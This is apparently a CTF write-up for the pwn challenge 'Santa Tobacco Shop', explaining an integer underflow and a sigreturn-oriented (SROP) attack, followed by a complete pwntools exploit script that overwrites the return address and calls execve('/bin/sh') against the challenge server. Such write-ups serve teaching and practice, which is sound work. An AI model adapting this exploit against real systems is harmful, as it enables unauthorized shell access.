---
title: "[pwn] Santa Tobacco Shop"
categories:
  - CTF/pwn
tags:
  - srop
  - int underflow
---

> checksec: disable all
> 

First, we build `rev` sigreturn frame (due to int underflow) call execve, `rdi` point to a var at bss section.

why stack frame can pop registers? After `leave` instruction, `rsp`  point to top of frame

Then, input `/bin//sh` to get shell

---

## xpl.py

```python
#!/usr/bin/env python3
from pwn import *
def start(argv=[], *a, **kw):
  return remote('challs.xmas.htsp.ro', 2002, *a, **kw)

gs = '''
init-pwndbg
b *0x401193
'''.format(**locals())

bss_inp = 0x402000

'''
; syscall execute, then input '/' to quit
syscall
mov eax, 0
mov edi, 0
mov rsi, offset bss_inp
mov edx, 8
syscall     ; read(stdin, bss_inp, 8)
'''
syscall = 0x401114

'''
mov eax, 0xf
nop
syscall
'''
sigreturn = 0x401199

# need rev because we write from hight to low addr
def sigreturn_execve():
  frame = SigreturnFrame()
  frame.rax = 0x3b  # execve syscall
  frame.rdi = bss_inp
  frame.rsi = 0   # NULL
  frame.rdx = 0   # NULL
  frame.rip = syscall

  frameValList = list(frame.values())
  frameValList.reverse()
  return flat(frameValList)

def send_buf(io, s):
  io.sendafter(b'(/quit to leave)\n', s)

exe = './main'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

frame = sigreturn_execve()
# int underflow
# wrap around with unsigned int16 index
send_buf(io, b"A" * (65496 - len(frame)))
send_buf(io, frame)
# overwrite rip by sigreturn syscall
send_buf(io, p64(sigreturn))
send_buf(io, b'//bin/sh\x00')
io.interactive()
```

---

more detail: https://memn0ps.gitlab.io/XMAS-Pwn-Santa-Tobacco-Shop/
